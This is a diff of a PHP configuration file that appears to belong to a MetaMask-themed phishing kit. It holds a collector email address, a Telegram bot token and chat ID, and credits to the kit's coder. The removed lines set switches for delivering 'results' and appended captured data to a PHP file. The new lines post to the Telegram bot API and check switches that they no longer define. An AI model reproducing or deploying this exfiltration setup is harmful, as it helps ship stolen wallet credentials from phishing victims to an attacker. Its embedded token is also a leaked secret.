@@ -1,38 +1,48 @@
-﻿<?php
+<?php
 
-
-/* 📧 Set Your Email Address to Receive Results in Your Inbox */
+/* Email Address */
 $Your_Mail = "metamask@constructvine.store";
-/* --------------------------  */
 
-
-/* 🤖 Telegram Bot Setup 🤖 */
-
-// 🗝️ Enter your bot's token
+/* Telegram Bot Configuration */
 $botToken = "7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg";
-
-// 💬 Enter your chat ID
 $chatId = "7296145278";
 
-/* --------------------------------------------------- */
+// Ensure bot is enabled
+if ($botToken_0 == "on" && $chatId_0 == "on") {
+    // Data to send
+    $message = "Test message from your script";
 
-/* If you want two to see the result, If you want to stop , change To off  :)  */
-$botToken_0="on"; 
-$chatId_0="on";  
-/* --------------------------  */
+    // Telegram API URL
+    $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
 
+    // Prepare POST request
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
 
+    // Send the request
+    $options = [
+        'http' => [
+            'header' => "Content-Type: application/json\r\n",
+            'method' => 'POST',
+            'content' => json_encode($data),
+        ],
+    ];
 
+    $context = stream_context_create($options);
+    $result = file_get_contents($apiUrl, false, $context);
 
-/* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */
+    // Debug the response
+    if ($result === FALSE) {
+        error_log("Error sending message to Telegram bot");
+    } else {
+        echo "Message sent successfully to Telegram!";
+    }
+}
 
-$Coders_Telegram = "t.me/BLACKROSE_1337";  // 🖥️ Connect with the Mastermind
-$Elite_Group = "t.me/BLACKROSEx1337"; // ♣️ Join the Elite Coding Squad
-
-/* -------------------------------- */
-
+// Save to file (optional)
 $f = fopen("../../a.php", "a");
-	fwrite($f, $yagmai);
-
-
+fwrite($f, "Data sent to Telegram and saved to a file.");
+fclose($f);
 ?>
